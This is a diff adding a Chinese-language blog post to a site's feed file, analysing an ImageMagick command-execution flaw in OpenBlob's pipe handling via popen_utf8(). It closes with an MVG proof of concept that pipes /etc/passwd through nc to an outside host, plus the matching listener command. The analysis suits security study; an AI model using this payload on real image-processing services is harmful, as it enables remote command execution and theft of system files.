@@ -3,6 +3,74 @@
   
     
     <entry>
+      <title><![CDATA[ImageMagick另一个命令执行--popen_utf8()函数]]></title>
+      <url>/2017/10/10/ImageMagick2/</url>
+      <content type="html"><![CDATA[<h2 id="心情杂谈"><a href="#心情杂谈" class="headerlink" title="心情杂谈"></a>心情杂谈</h2><p>哎哎哎,老司机一言不合就爆洞啊,这个洞在之前分析CVE-2016-3714的时候也发现了,结果被捂烂了…心塞塞~那我就写一下当时是怎么发现怎么这个洞…</p>
+<h2 id="漏洞分析正文"><a href="#漏洞分析正文" class="headerlink" title="漏洞分析正文"></a>漏洞分析正文</h2><p>之前在分析CVE-2016-3714的时候想,<code>system()</code>函数处理有问题,那么其他类似的有哪些函数呢?</p>
+<p>下面是一个可以执行命令的函数列表:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">system()</div><div class="line"></div><div class="line">popen()</div><div class="line"></div><div class="line">fork()+exec()</div><div class="line"></div><div class="line">execl()</div></pre></td></tr></table></figure>
+<p>那么搜索一下调用<code>system()</code>函数有哪些地方?经过搜索的话,最终只有CVE-2016-3714这个漏洞点调用到了一个<code>system()</code>. 那这么接下来搜索一下<code>popen()</code>函数调用点</p>
+<a id="more"></a>
+<p>文件:magick/blob.c:2503行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#if defined(SIGPIPE)</div><div class="line">if (*type == &apos;w&apos;)</div><div class="line">(void) signal(SIGPIPE,SIG_IGN);</div><div class="line">#endif</div><div class="line">*mode=(*type);</div><div class="line">mode[1]=&apos;\0&apos;;</div><div class="line">image-&gt;blob-&gt;file_info.file=(FILE *) popen_utf8(filename+1,mode);</div><div class="line">if (image-&gt;blob-&gt;file_info.file == (FILE *) NULL)</div><div class="line">&#123;</div><div class="line">ThrowFileException(exception,BlobError,&quot;UnableToOpenBlob&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div><div class="line">image-&gt;blob-&gt;type=PipeStream;</div><div class="line">image-&gt;blob-&gt;exempt=MagickTrue;</div><div class="line">return(SetStreamBuffering(image_info,image));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我们可以看到有一个<code>popen_utf8()</code>函数.</p>
+<p>跟进函数文件:magick/utility-private.h:173行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">static inline FILE *popen_utf8(const char *command,const char *type)</div><div class="line">&#123;</div><div class="line">#if !defined(MAGICKCORE_WINDOWS_SUPPORT) || defined(__CYGWIN__) || defined(__MINGW32__) || defined(__MINGW64__)</div><div class="line">return(popen(command,type));</div><div class="line">#else</div><div class="line">FILE</div><div class="line">*file;</div><div class="line"></div><div class="line">wchar_t</div><div class="line">*type_wide,</div><div class="line">*command_wide;</div><div class="line"></div><div class="line">command_wide=create_wchar_path(command);</div><div class="line">if (command_wide == (wchar_t *) NULL)</div><div class="line">return((FILE *) NULL);</div><div class="line">type_wide=create_wchar_path(type);</div><div class="line">if (type_wide == (wchar_t *) NULL)</div><div class="line">&#123;</div><div class="line">command_wide=(wchar_t *) RelinquishMagickMemory(command_wide);</div><div class="line">return((FILE *) NULL);</div><div class="line">&#125;</div><div class="line">file=_wpopen(command_wide,type_wide);</div><div class="line">type_wide=(wchar_t *) RelinquishMagickMemory(type_wide);</div><div class="line">command_wide=(wchar_t *) RelinquishMagickMemory(command_wide);</div><div class="line">return(file);</div><div class="line">#endif</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看见<code>popen_utf8()</code>直接return了<code>popen()</code>函数的值回来.</p>
+<p>那么问题来了,谁调用了<code>popen_utf8</code>呢？</p>
+<p>向上追溯代码可以看到是<code>OpenBlob()</code>函数调用了<code>popen_utf8</code>.继续查看谁调用了<code>OpenBlob()</code></p>
+<p><img src="/2017/10/10/ImageMagick2/1879977320.png" alt="8248DCA8-27B0-46A0-A5EE-25C3EA3BB8FF.png"></p>
+<p>我们可以看到一堆地方调用到了<code>OpenBlob()</code>,看到一个眼熟的地方!</p>
+<p>使用GDB反调会让眼熟的地方明显一点</p>
+<p><img src="/2017/10/10/ImageMagick2/1560639559.png" alt="5B98ABC0-8703-43CC-A6C4-53B19D9BBD8F.png"><br>可以看到流程中有<code>constitute.c</code>调用到<code>OpenBlob()</code>.而之前分析的时候也经常看<code>constitute.c</code>,很明显会选择先看这个地方的调用有没有问题.</p>
+<p>在<code>constitute.c:448行</code></p>
+<p>可以看到<code>status＝OpenBlob(image_info,image,ReadBinaryBlobMode,exception);</code></p>
+<p>status在imagemagick里面一般都是用MagickTrue或者MagickFalse作为最终的函数返回值的,知道这点就好了.</p>
+<p><code>OpenBlob(image_info,image,ReadBinaryBlobMode,exception);</code></p>
+<p>在这个函数中<code>image_info,image</code>两个参数的值都是由我们传进去的.</p>
+<p>OpenBlob函数先进行了<code>Policy</code>的检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">if (*type == &apos;w&apos;)</div><div class="line">rights=WritePolicyRights;</div><div class="line">if (IsRightsAuthorized(PathPolicyDomain,rights,filename) == MagickFalse)</div><div class="line">&#123;</div><div class="line">errno=EPERM;</div><div class="line">(void) ThrowMagickException(exception,GetMagickModule(),PolicyError,</div><div class="line">&quot;NotAuthorized&quot;,&quot;`%s&apos;&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>最重要的一段在如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">if (*filename == &apos;|&apos;)</div><div class="line">&#123;</div><div class="line">char</div><div class="line">mode[MaxTextExtent];</div><div class="line"></div><div class="line">/*</div><div class="line">Pipe image to or from a system command.</div><div class="line">*/</div><div class="line">#if defined(SIGPIPE)</div><div class="line">if (*type == &apos;w&apos;)</div><div class="line">(void) signal(SIGPIPE,SIG_IGN);</div><div class="line">#endif</div><div class="line">*mode=(*type);</div><div class="line">mode[1]=&apos;\0&apos;;</div><div class="line">image-&gt;blob-&gt;file_info.file=(FILE *) popen_utf8(filename+1,mode);</div><div class="line">if (image-&gt;blob-&gt;file_info.file == (FILE *) NULL)</div><div class="line">&#123;</div><div class="line">ThrowFileException(exception,BlobError,&quot;UnableToOpenBlob&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>因为<code>*filename</code>指向指针的第一个字符,如果第一个字符是<code>|</code>那么就调用<code>popen_utf8()</code>去打开文件.</p>
+<p>所以我们要控制的就是<code>|</code>后面的字符.如果我们想要控制这里的<code>filename</code>就意味着我们需要传入的文件的名称<code>|</code>+<code>你要执行的命令</code></p>
+<p>经过测试这个是可以的,这个地方可以命令执行,但是万一要是上传的文件名字有限制<code>|</code>这个符号不让作为文件名的名字的话,那就挺别扭的.而且<code>windows</code>底下应该是不能用<code>|</code>作为文件的名字的,所以还是把payload写在文件里面比较好.</p>
+<p>通过对imagemagick源码的浏览,并且查询imagemagick的官方文档.</p>
+<p><a href="http://www.imagemagick.org/script/magick-vector-graphics.php" target="_blank" rel="external">官方文档</a></p>
+<p>可以发现mvg有很多需要操作文件mvg内文件的原语,这些地方都是会调用到<code>OpenBlob()</code></p>
+<p>例如以下操作:</p>
+<p><img src="/2017/10/10/ImageMagick2/1398429269.png" alt="D51CD2F4-9C55-48D5-B28D-5B1551B4C4E8.png"></p>
+<p><img src="/2017/10/10/ImageMagick2/1259270032.png" alt="29336A5F-27D6-442F-86CF-C49C720A1AF9.png"></p>
+<p><img src="/2017/10/10/ImageMagick2/1921966953.png" alt="C973A35E-D2D6-43AA-A6DF-D43D0F8FEB3B.png"></p>
+<p><img src="/2017/10/10/ImageMagick2/3752992863.png" alt="F4958AC8-5D13-49B2-99E8-61175C9BFDCE.png"></p>
+<p>Poc使用<code>image over</code>这个原语.</p>
+<p>那么Poc就出来了</p>
+<p><code>1.mvg</code>文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image Over 0,0 0,0 &apos;|cat /etc/passwd|nc lonelyrain.me 9999&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>然后attack的服务器运行<code>nc -l 0.0.0.0 9999 &gt; passwd</code></p>
+<p>这个漏洞有兴趣的同学可以去再找一下其它玩法…</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> Imagetragick </tag>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Imagetragick(CVE-2016-3714)执行过程,漏洞分析以及修复方案]]></title>
       <url>/2017/10/10/Imagetragick/</url>
       <content type="html"><![CDATA[<p>##什么是ImageMagick</p>
